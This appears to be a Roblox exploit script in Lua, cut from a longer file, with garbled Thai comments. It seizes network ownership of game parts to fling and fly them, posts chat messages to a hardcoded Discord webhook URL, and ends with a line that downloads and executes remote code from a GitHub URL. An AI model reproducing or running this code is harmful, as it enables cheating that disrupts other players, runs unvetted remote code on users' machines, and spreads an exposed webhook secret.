        -- ‡∏ñ‡πâ‡∏≤‡∏¢‡∏±‡∏á‡πÑ‡∏°‡πà‡∏°‡∏µ‡πÉ‡∏´‡πâ‡∏î‡∏∂‡∏á‡∏ï‡∏±‡∏ß‡πÉ‡∏´‡∏°‡πà
        if not part and #available > 0 then
            part = table.remove(available, 1)
            buildPartsMap[part] = pt.key
        end

        if part and part.Parent then
            usedThisFrame[part] = true
            -- ‡∏õ‡∏£‡∏±‡∏ö‡∏£‡∏∞‡∏¢‡∏∞‡∏´‡πà‡∏≤‡∏á‡∏ï‡∏≤‡∏°‡∏Ç‡∏ô‡∏≤‡∏î Part
            local gap = (part.Size.X + part.Size.Y + part.Size.Z) / 3 * 1.4
            
            -- ‡πÅ‡∏Å‡πâ‡πÑ‡∏Ç‡∏Å‡∏≤‡∏£‡∏Ñ‡∏≥‡∏ô‡∏ß‡∏ì‡πÅ‡∏Å‡∏ô Y ‡πÉ‡∏´‡πâ‡πÑ‡∏°‡πà‡∏Å‡∏•‡∏±‡∏ö‡∏´‡∏±‡∏ß
            -- UI y=1 (‡∏ö‡∏ô‡∏™‡∏∏‡∏î) -> World offsetY ‡∏™‡∏π‡∏á‡∏™‡∏∏‡∏î
            -- UI y=gridRes (‡∏•‡πà‡∏≤‡∏á‡∏™‡∏∏‡∏î) -> World offsetY ‡∏ï‡πà‡∏≥‡∏™‡∏∏‡∏î
            local offsetX = (pt.x - (gridRes/2)) * gap
            local offsetY = ((gridRes/2) - pt.y) * gap 
            
            -- ‡∏ï‡∏≥‡πÅ‡∏´‡∏ô‡πà‡∏á‡∏£‡∏≠‡∏ö‡∏ï‡∏±‡∏ß (‡∏£‡∏∞‡∏¢‡∏∞‡∏´‡∏ô‡πâ‡∏≤ 6 stud)
            local targetPos = baseCFrame * CFrame.new(offsetX, offsetY, -6)

            pcall(function() part:SetNetworkOwner(LP) end)
            part.CanCollide = false
            part.Anchored = false

            local bp = part:FindFirstChild("BodyPosition") or Instance.new("BodyPosition", part)
            bp.MaxForce = Vector3.new(1,1,1) * 500000; bp.P = 30000; bp.Position = targetPos.Position
            
            local bg = part:FindFirstChild("BodyGyro") or Instance.new("BodyGyro", part)
            bg.MaxTorque = Vector3.new(1,1,1) * 500000; bg.CFrame = targetPos
        end
    end

    -- ‡∏õ‡∏•‡πà‡∏≠‡∏¢ Part ‡∏ó‡∏µ‡πà‡∏ñ‡∏π‡∏Å‡∏•‡∏ö‡∏≠‡∏≠‡∏Å‡∏à‡∏≤‡∏Å UI (Toggle Off)
    for p, key in pairs(buildPartsMap) do
        if not usedThisFrame[p] then
            if p:FindFirstChild("BodyPosition") then p.BodyPosition:Destroy() end
            if p:FindFirstChild("BodyGyro") then p.BodyGyro:Destroy() end
            p.CanCollide = true
            buildPartsMap[p] = nil
        end
    end
end)
-- [[ 1. SETTINGS & VARIABLES ]] --
local LP = game:GetService("Players").LocalPlayer
local Cam = workspace.CurrentCamera
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")

local carModeEnabled = false 
local isDriving = false
local currentCarPart = nil
local carBV = nil
local carBG = nil

-- ‡∏Ñ‡πà‡∏≤‡∏Ñ‡∏ß‡∏≤‡∏°‡πÄ‡∏£‡πá‡∏ß‡∏£‡∏ñ
local speed = 50
local turnSpeed = 3
local moveState = {forward = 0, side = 0, up = 0}

-- [[ 2. UI CREATION (MOBILE STYLE) ]] --
local carGui = Instance.new("ScreenGui")
carGui.Name = "RealCarUI_FE"
carGui.ResetOnSpawn = false
carGui.Enabled = false
pcall(function() carGui.Parent = game:GetService("CoreGui") end)

local function createPedal(parent, text, position, size, color)
    local btn = Instance.new("TextButton", parent)
    btn.Text = text
    btn.Position = position
    btn.Size = size
    btn.BackgroundColor3 = color or Color3.fromRGB(20, 20, 20)
    btn.BackgroundTransparency = 0.2
    btn.TextColor3 = Color3.new(1, 1, 1)
    btn.Font = Enum.Font.GothamBold
    btn.TextSize = 18
    local corner = Instance.new("UICorner", btn)
    corner.CornerRadius = UDim.new(0, 10)
    local stroke = Instance.new("UIStroke", btn)
    stroke.Color = Color3.fromRGB(200, 200, 200)
    stroke.Thickness = 2
    stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    return btn
end

-- Left Zone (Steering)
local leftZone = Instance.new("Frame", carGui)
leftZone.Size = UDim2.fromOffset(250, 150)
leftZone.Position = UDim2.new(0, 20, 1, -180)
leftZone.BackgroundTransparency = 1

local btnLeft = createPedal(leftZone, "<", UDim2.new(0, 0, 0.3, 0), UDim2.new(0, 80, 0, 80))
local btnRight = createPedal(leftZone, ">", UDim2.new(0, 100, 0.3, 0), UDim2.new(0, 80, 0, 80))

-- Right Zone (Pedals)
local rightZone = Instance.new("Frame", carGui)
rightZone.Size = UDim2.fromOffset(250, 250)
rightZone.Position = UDim2.new(1, -270, 1, -280)
rightZone.BackgroundTransparency = 1

local btnGas = createPedal(rightZone, "GAS", UDim2.new(0.5, 0, 0.3, 0), UDim2.new(0, 70, 0, 120), Color3.fromRGB(0, 100, 0))
local btnBrake = createPedal(rightZone, "BRAKE", UDim2.new(0.1, 0, 0.5, 0), UDim2.new(0, 80, 0, 60), Color3.fromRGB(100, 0, 0))

local btnRise = createPedal(rightZone, "RISE", UDim2.new(0.1, 0, 0, 0), UDim2.new(0, 60, 0, 40), Color3.fromRGB(0, 150, 255))
local btnSink = createPedal(rightZone, "SINK", UDim2.new(0.6, 0, 0, 0), UDim2.new(0, 60, 0, 40), Color3.fromRGB(0, 150, 255))

-- Exit Button
local btnExit = createPedal(carGui, "EXIT CAR", UDim2.new(0.5, -60, 0.85, 0), UDim2.new(0, 120, 0, 40), Color3.fromRGB(200, 50, 50))
-- [[ SPEED CONTROL ADDITION ]] --

-- ‡∏™‡∏£‡πâ‡∏≤‡∏á Frame ‡∏™‡∏≥‡∏´‡∏£‡∏±‡∏ö‡∏Ñ‡∏ß‡∏ö‡∏Ñ‡∏∏‡∏°‡∏Ñ‡∏ß‡∏≤‡∏°‡πÄ‡∏£‡πá‡∏ß (‡∏ß‡∏≤‡∏á‡πÑ‡∏ß‡πâ‡πÄ‡∏´‡∏ô‡∏∑‡∏≠‡∏õ‡∏∏‡πà‡∏° Exit)
local speedControlFrame = Instance.new("Frame", carGui)
speedControlFrame.Size = UDim2.fromOffset(160, 60)
speedControlFrame.Position = UDim2.new(0.5, -80, 0.76, 0) -- ‡∏≠‡∏¢‡∏π‡πà‡πÄ‡∏´‡∏ô‡∏∑‡∏≠‡∏õ‡∏∏‡πà‡∏° Exit ‡πÄ‡∏•‡πá‡∏Å‡∏ô‡πâ‡∏≠‡∏¢
speedControlFrame.BackgroundTransparency = 1

-- ‡∏õ‡πâ‡∏≤‡∏¢‡πÅ‡∏™‡∏î‡∏á‡∏Ñ‡∏ß‡∏≤‡∏°‡πÄ‡∏£‡πá‡∏ß‡∏õ‡∏±‡∏à‡∏à‡∏∏‡∏ö‡∏±‡∏ô
local speedDisplay = Instance.new("TextLabel", speedControlFrame)
speedDisplay.Size = UDim2.new(1, 0, 0.4, 0)
speedDisplay.Position = UDim2.new(0, 0, 0, 0)
speedDisplay.BackgroundTransparency = 1
speedDisplay.Text = "SPEED: " .. speed
speedDisplay.TextColor3 = Color3.fromRGB(255, 255, 0) -- ‡∏™‡∏µ‡πÄ‡∏´‡∏•‡∏∑‡∏≠‡∏á‡πÉ‡∏´‡πâ‡πÄ‡∏î‡πà‡∏ô
speedDisplay.Font = Enum.Font.GothamBlack
speedDisplay.TextSize = 16

-- ‡∏õ‡∏∏‡πà‡∏°‡∏•‡∏î‡∏Ñ‡∏ß‡∏≤‡∏°‡πÄ‡∏£‡πá‡∏ß (-)
local btnSpeedDown = createPedal(speedControlFrame, "-", UDim2.new(0.1, 0, 0.5, 0), UDim2.new(0.35, 0, 0, 30), Color3.fromRGB(60, 60, 60))

-- ‡∏õ‡∏∏‡πà‡∏°‡πÄ‡∏û‡∏¥‡πà‡∏°‡∏Ñ‡∏ß‡∏≤‡∏°‡πÄ‡∏£‡πá‡∏ß (+)
local btnSpeedUp = createPedal(speedControlFrame, "+", UDim2.new(0.55, 0, 0.5, 0), UDim2.new(0.35, 0, 0, 30), Color3.fromRGB(60, 60, 60))

-- ‡∏ü‡∏±‡∏á‡∏Å‡πå‡∏ä‡∏±‡∏ô‡∏Å‡∏≤‡∏£‡∏ó‡∏≥‡∏á‡∏≤‡∏ô‡∏Ç‡∏≠‡∏á‡∏õ‡∏∏‡πà‡∏°
btnSpeedDown.MouseButton1Click:Connect(function()
    speed = math.max(2, speed - 2) -- ‡∏•‡∏î‡∏ó‡∏µ‡∏•‡∏∞ 10 ‡∏ï‡πà‡∏≥‡∏™‡∏∏‡∏î‡∏Ñ‡∏∑‡∏≠ 10
    speedDisplay.Text = "SPEED: " .. speed
end)

btnSpeedUp.MouseButton1Click:Connect(function()
    speed = speed + 2 -- ‡πÄ‡∏û‡∏¥‡πà‡∏°‡∏ó‡∏µ‡∏•‡∏∞ 10
    speedDisplay.Text = "SPEED: " .. speed
end)


-- [[ 3. MAIN MENU INTEGRATION ]] --
if pages and pages.main then
    label(pages.main, "--- CAR MODE (FE FIX) ---")
    btn(pages.main, "ENABLE CAR MODE: OFF", function(b)
        carModeEnabled = not carModeEnabled
        b.Text = "ENABLE CAR MODE: " .. (carModeEnabled and "ON" or "OFF")
        b.BackgroundColor3 = carModeEnabled and Color3.fromRGB(0, 180, 0) or Color3.fromRGB(70, 70, 70)
        if not carModeEnabled and isDriving then stopDriving() end
    end)
end

-- [[ 4. CORE FUNCTIONS ]] --

function stopDriving()
    isDriving = false
    carGui.Enabled = false
    
    if carBV then carBV:Destroy() carBV = nil end
    if carBG then carBG:Destroy() carBG = nil end
    
    if currentCarPart then
        currentCarPart = nil
    end
    
    if LP.Character and LP.Character:FindFirstChild("HumanoidRootPart") then
        local hum = LP.Character:FindFirstChild("Humanoid")
        if hum then 
            hum.PlatformStand = false 
            hum.Sit = false
        end
        -- ‡∏î‡∏µ‡∏î‡∏ï‡∏±‡∏ß‡∏Ç‡∏∂‡πâ‡∏ô‡πÄ‡∏•‡πá‡∏Å‡∏ô‡πâ‡∏≠‡∏¢‡πÄ‡∏û‡∏∑‡πà‡∏≠‡∏õ‡πâ‡∏≠‡∏á‡∏Å‡∏±‡∏ô‡∏Å‡∏≤‡∏£‡∏ï‡∏¥‡∏î‡∏ö‡∏±‡∏Ñ
        LP.Character.HumanoidRootPart.Velocity = Vector3.new(0,0,0)
    end
end

function startDriving(part)
    if not part or not part:IsA("BasePart") or part.Anchored then return end
    
    currentCarPart = part
    isDriving = true
    carGui.Enabled = true
    
    -- ‡∏û‡∏¢‡∏≤‡∏¢‡∏≤‡∏°‡∏¢‡∏∂‡∏î Network Owner (‡πÄ‡∏û‡∏∑‡πà‡∏≠‡πÉ‡∏´‡πâ Part ‡∏Ç‡∏¢‡∏±‡∏ö‡∏•‡∏∑‡πà‡∏ô‡πÜ)
    pcall(function() part:SetNetworkOwner(LP) end)
    
    -- ‡∏ï‡∏±‡πâ‡∏á‡∏Ñ‡πà‡∏≤‡∏ï‡∏±‡∏ß‡∏•‡∏∞‡∏Ñ‡∏£
    local char = LP.Character
    if char and char:FindFirstChild("Humanoid") then
        -- ‡πÉ‡∏ä‡πâ PlatformStand ‡πÄ‡∏û‡∏∑‡πà‡∏≠‡πÑ‡∏°‡πà‡πÉ‡∏´‡πâ Animation ‡∏Å‡∏≤‡∏£‡πÄ‡∏î‡∏¥‡∏ô‡∏°‡∏±‡∏ô‡∏ï‡∏µ‡∏Å‡∏±‡∏ö‡∏Å‡∏≤‡∏£‡∏Ç‡∏¢‡∏±‡∏ö
        char.Humanoid.PlatformStand = true 
    end
    
    -- ‡∏™‡∏£‡πâ‡∏≤‡∏á‡πÅ‡∏£‡∏á‡∏Ç‡∏±‡∏ö‡πÄ‡∏Ñ‡∏•‡∏∑‡πà‡∏≠‡∏ô Part
    carBV = Instance.new("BodyVelocity", part)
    carBV.MaxForce = Vector3.new(1e6, 1e6, 1e6)
    carBV.Velocity = Vector3.new(0, 0, 0)
    
    carBG = Instance.new("BodyGyro", part)
    carBG.MaxTorque = Vector3.new(1e6, 1e6, 1e6)
    carBG.P = 10000
    carBG.CFrame = part.CFrame
end

-- [[ 5. CONTROLS ]] --
UserInputService.InputBegan:Connect(function(input, gp)
    if gp then return end
    if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then
        if carModeEnabled and not isDriving then
            local mousePos = UserInputService:GetMouseLocation()
            local ray = Cam:ViewportPointToRay(mousePos.X, mousePos.Y)
            local res = workspace:Raycast(ray.Origin, ray.Direction * 1000)
            
            if res and res.Instance then
                local p = res.Instance
                local model = p:FindFirstAncestorOfClass("Model")
                if not (model and model:FindFirstChild("Humanoid")) then
                    startDriving(p)
                end
            end
        end
    end
end)

local function linkBtn(btn, axis, val)
    btn.MouseButton1Down:Connect(function() moveState[axis] = val end)
    btn.MouseButton1Up:Connect(function() moveState[axis] = 0 end)
    btn.MouseLeave:Connect(function() moveState[axis] = 0 end)
end

linkBtn(btnGas, "forward", 1)
linkBtn(btnBrake, "forward", -1)
linkBtn(btnLeft, "side", 1)
linkBtn(btnRight, "side", -1)
linkBtn(btnRise, "up", 1)
linkBtn(btnSink, "up", -1)
btnExit.MouseButton1Click:Connect(stopDriving)

-- PC Controls
UserInputService.InputBegan:Connect(function(input, gp)
    if gp or not isDriving then return end
    if input.KeyCode == Enum.KeyCode.W then moveState.forward = 1
    elseif input.KeyCode == Enum.KeyCode.S then moveState.forward = -1
    elseif input.KeyCode == Enum.KeyCode.A then moveState.side = 1
    elseif input.KeyCode == Enum.KeyCode.D then moveState.side = -1
    elseif input.KeyCode == Enum.KeyCode.E then moveState.up = 1
    elseif input.KeyCode == Enum.KeyCode.Q then moveState.up = -1 
    elseif input.KeyCode == Enum.KeyCode.X then stopDriving() end
end)

UserInputService.InputEnded:Connect(function(input)
    if not isDriving then return end
    if input.KeyCode == Enum.KeyCode.W or input.KeyCode == Enum.KeyCode.S then moveState.forward = 0
    elseif input.KeyCode == Enum.KeyCode.A or input.KeyCode == Enum.KeyCode.D then moveState.side = 0
    elseif input.KeyCode == Enum.KeyCode.E or input.KeyCode == Enum.KeyCode.Q then moveState.up = 0 end
end)

-- [[ 6. FE PHYSICS LOOP (THE FIX) ]] --
RunService.Heartbeat:Connect(function()
    if isDriving and currentCarPart and currentCarPart.Parent then
        if not carBV or not carBG then return end
        
        -- 1. ‡∏Ç‡∏¢‡∏±‡∏ö Part (‡∏£‡∏ñ)
        if moveState.side ~= 0 then
            carBG.CFrame = carBG.CFrame * CFrame.Angles(0, math.rad(moveState.side * turnSpeed), 0)
        end
        local fwd = carBG.CFrame.LookVector * (moveState.forward * speed)
        local up = Vector3.new(0, moveState.up * (speed * 0.8), 0)
        carBV.Velocity = fwd + up
        
        -- 2. FE SYNC: ‡∏ö‡∏±‡∏á‡∏Ñ‡∏±‡∏ö‡∏ï‡∏±‡∏ß‡∏•‡∏∞‡∏Ñ‡∏£‡πÉ‡∏´‡πâ‡∏ï‡∏¥‡∏î‡∏Å‡∏±‡∏ö Part (‡∏ß‡∏¥‡∏ò‡∏µ‡∏ô‡∏µ‡πâ‡∏Ñ‡∏ô‡∏≠‡∏∑‡πà‡∏ô‡∏à‡∏∞‡πÄ‡∏´‡πá‡∏ô‡πÄ‡∏£‡∏≤‡∏Ç‡∏¢‡∏±‡∏ö‡∏î‡πâ‡∏ß‡∏¢‡πÅ‡∏ô‡πà‡∏ô‡∏≠‡∏ô)
        if LP.Character and LP.Character:FindFirstChild("HumanoidRootPart") then
            local root = LP.Character.HumanoidRootPart
            -- ‡∏Ñ‡∏≥‡∏ô‡∏ß‡∏ì‡∏ï‡∏≥‡πÅ‡∏´‡∏ô‡πà‡∏á: ‡∏≠‡∏¢‡∏π‡πà‡πÄ‡∏´‡∏ô‡∏∑‡∏≠ Part ‡πÄ‡∏•‡πá‡∏Å‡∏ô‡πâ‡∏≠‡∏¢ + ‡∏´‡∏±‡∏ô‡∏´‡∏ô‡πâ‡∏≤‡∏ï‡∏≤‡∏° Part
            local targetCFrame = currentCarPart.CFrame * CFrame.new(0, currentCarPart.Size.Y/2 + 3, 0)
            
            -- ‡∏™‡∏±‡πà‡∏á‡∏¢‡πâ‡∏≤‡∏¢‡∏ï‡∏≥‡πÅ‡∏´‡∏ô‡πà‡∏á CFrame ‡∏ó‡∏∏‡∏Å‡πÄ‡∏ü‡∏£‡∏°
            root.CFrame = targetCFrame
            -- ‡∏•‡∏ö‡πÅ‡∏£‡∏á‡πÄ‡∏â‡∏∑‡πà‡∏≠‡∏¢‡∏Ç‡∏≠‡∏á‡∏ï‡∏±‡∏ß‡∏•‡∏∞‡∏Ñ‡∏£‡∏≠‡∏≠‡∏Å ‡πÄ‡∏û‡∏∑‡πà‡∏≠‡πÑ‡∏°‡πà‡πÉ‡∏´‡πâ‡∏Å‡∏£‡∏∞‡∏ï‡∏∏‡∏Å
            root.Velocity = Vector3.new(0,0,0) 
            root.RotVelocity = Vector3.new(0,0,0)
        end
        
        -- Network Owner Keep Alive
        pcall(function() currentCarPart:SetNetworkOwner(LP) end)
        
    elseif isDriving and (not currentCarPart or not currentCarPart.Parent) then
        stopDriving()
    end
end)
-- [[ GLOBAL CHAT SYSTEM - V2 FIXED ]] --
local HttpService = game:GetService("HttpService")
local webhookURL = "https://discord.com/api/webhooks/1469729669246091335/4ZrruAPLek5P3X4D7dKnarAv60IUPewCjKl9dg4oeKJpH-mi2fdOfWkq-PEtRki0yt9h"

-- ‡∏™‡∏£‡πâ‡∏≤‡∏á‡∏´‡∏ô‡πâ‡∏≤ Chat
pages.chat = createPage()
local chatContainer = pages.chat

-- [[ UI SETUP ]] --

-- Top Bar Frame (Container ‡∏™‡∏≥‡∏´‡∏£‡∏±‡∏ö‡∏õ‡∏∏‡πà‡∏°‡∏î‡πâ‡∏≤‡∏ô‡∏ö‡∏ô)
local topBar = Instance.new("Frame", chatContainer)
topBar.Size = UDim2.new(1, -20, 0, 35)
topBar.Position = UDim2.new(0, 10, 0, 5)
topBar.BackgroundTransparency = 1

-- ‡∏õ‡∏∏‡πà‡∏° BACK (‡∏ù‡∏±‡πà‡∏á‡∏ã‡πâ‡∏≤‡∏¢)
local btnBack = btn(topBar, "BACK", function()
    showPage("main")
end)
btnBack.Size = UDim2.new(0.3, 0, 1, 0)
btnBack.Position = UDim2.new(0, 0, 0, 0)
btnBack.BackgroundColor3 = Color3.fromRGB(180, 50, 50)

-- ‡∏õ‡∏∏‡πà‡∏° CLEAR (‡∏ù‡∏±‡πà‡∏á‡∏Ç‡∏ß‡∏≤ - ‡πÅ‡∏Å‡πâ‡πÉ‡∏´‡πâ‡∏ó‡∏≥‡∏á‡∏≤‡∏ô 100%)
local btnClear = btn(topBar, "CLEAR CHAT", function()
    local scroll = chatContainer:FindFirstChild("GlobalScrollingFrame")
    if scroll then
        for _, v in pairs(scroll:GetChildren()) do
            if v:IsA("Frame") then
                v:Destroy()
            end
        end
    end
end)
btnClear.Size = UDim2.new(0.65, 0, 1, 0)
btnClear.Position = UDim2.new(0.35, 0, 0, 0)
btnClear.BackgroundColor3 = Color3.fromRGB(60, 60, 60)

-- Chat Log (‡πÄ‡∏û‡∏¥‡πà‡∏°‡∏ä‡∏∑‡πà‡∏≠‡πÄ‡∏â‡∏û‡∏≤‡∏∞‡πÄ‡∏û‡∏∑‡πà‡∏≠‡∏õ‡πâ‡∏≠‡∏á‡∏Å‡∏±‡∏ô‡∏Å‡∏≤‡∏£‡∏•‡∏ö‡∏ú‡∏¥‡∏î‡∏ï‡∏±‡∏ß)
local chatScroll = Instance.new("ScrollingFrame", chatContainer)
chatScroll.Name = "GlobalScrollingFrame"
chatScroll.Position = UDim2.new(0.05, 0, 0, 45)
chatScroll.Size = UDim2.new(0.9, 0, 0.55, 0)
chatScroll.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
chatScroll.BorderSizePixel = 0
chatScroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
chatScroll.ScrollBarThickness = 2

local chatLayout = Instance.new("UIListLayout", chatScroll)
chatLayout.Padding = UDim.new(0, 5)
chatLayout.SortOrder = Enum.SortOrder.LayoutOrder

-- Input Area (‡∏™‡πà‡∏ß‡∏ô‡∏û‡∏¥‡∏°‡∏û‡πå‡∏Ç‡πâ‡∏≠‡∏Ñ‡∏ß‡∏≤‡∏°)
local inputArea = Instance.new("Frame", chatContainer)
inputArea.Size = UDim2.new(0.9, 0, 0.3, 0)
inputArea.Position = UDim2.new(0.05, 0, 0.65, 0)
inputArea.BackgroundTransparency = 1

local txtMsg = Instance.new("TextBox", inputArea)
txtMsg.Size = UDim2.new(1, 0, 0, 35)
txtMsg.PlaceholderText = "Type your message here..."
txtMsg.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
txtMsg.TextColor3 = Color3.new(1,1,1)
txtMsg.Font = Enum.Font.Gotham
txtMsg.TextSize = 14
txtMsg.ClearTextOnFocus = false
Instance.new("UICorner", txtMsg)

local btnSend = btn(inputArea, "SEND TO GLOBAL", function() end)
btnSend.Position = UDim2.new(0, 0, 0, 42)
btnSend.Size = UDim2.new(1, 0, 0, 38)
btnSend.BackgroundColor3 = Color3.fromRGB(0, 110, 220)

-- [[ LOGIC ]] --

local function addMessage(name, message)
    local msgFrame = Instance.new("Frame", chatScroll)
    msgFrame.Size = UDim2.new(1, 0, 0, 0)
    msgFrame.AutomaticSize = Enum.AutomaticSize.Y
    msgFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
    Instance.new("UICorner", msgFrame)

    local textLabel = Instance.new("TextLabel", msgFrame)
    textLabel.Size = UDim2.new(1, -55, 0, 0)
    textLabel.Position = UDim2.new(0, 8, 0, 5)
    textLabel.AutomaticSize = Enum.AutomaticSize.Y
    textLabel.BackgroundTransparency = 1
    textLabel.TextWrapped = true
    textLabel.TextXAlignment = Enum.TextXAlignment.Left
    textLabel.Font = Enum.Font.GothamMedium
    textLabel.TextSize = 13
    textLabel.TextColor3 = Color3.new(1,1,1)
    textLabel.Text = "[" .. name .. "]: " .. message

    local cp = Instance.new("TextButton", msgFrame)
    cp.Size = UDim2.new(0, 45, 0, 20)
    cp.Position = UDim2.new(1, -50, 0, 5)
    cp.Text = "Copy"
    cp.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
    cp.TextColor3 = Color3.new(1,1,1)
    Instance.new("UICorner", cp)

    cp.MouseButton1Click:Connect(function()
        setclipboard(message)
        cp.Text = "Done"
        task.wait(1)
        cp.Text = "Copy"
    end)
    -- ‡∏•‡∏ö Auto-scroll ‡∏≠‡∏≠‡∏Å‡∏ï‡∏≤‡∏°‡∏Ñ‡∏≥‡∏Ç‡∏≠ (‡∏´‡∏ô‡πâ‡∏≤‡∏à‡∏≠‡∏à‡∏∞‡πÑ‡∏°‡πà‡πÄ‡∏•‡∏∑‡πà‡∏≠‡∏ô‡πÄ‡∏≠‡∏á)
end

btnSend.MouseButton1Click:Connect(function()
    local msg = txtMsg.Text
    if msg == "" then return end

    local request = (syn and syn.request) or (http and http.request) or http_request or request
    if request then
        task.spawn(function()
            pcall(function()
                request({
                    Url = webhookURL,
                    Method = "POST",
                    Headers = { ["Content-Type"] = "application/json" },
                    Body = HttpService:JSONEncode({
                        username = game.Players.LocalPlayer.Name,
                        content = msg
                    })
                })
            end)
        end)
    end

    addMessage(game.Players.LocalPlayer.Name, msg)
    txtMsg.Text = ""
end)

-- ‡∏õ‡∏∏‡πà‡∏°‡πÄ‡∏õ‡∏¥‡∏î‡∏à‡∏≤‡∏Å‡∏´‡∏ô‡πâ‡∏≤‡∏´‡∏•‡∏±‡∏Å
label(pages.main, "--- COMMUNICATION ---")
btn(pages.main, "OPEN GLOBAL CHAT", function()
    showPage("chat")
end)

loadstring(game:HttpGet("https://raw.githubusercontent.com/randomstring0/Qwerty/main/qwerty1.lua"))() --garvityo
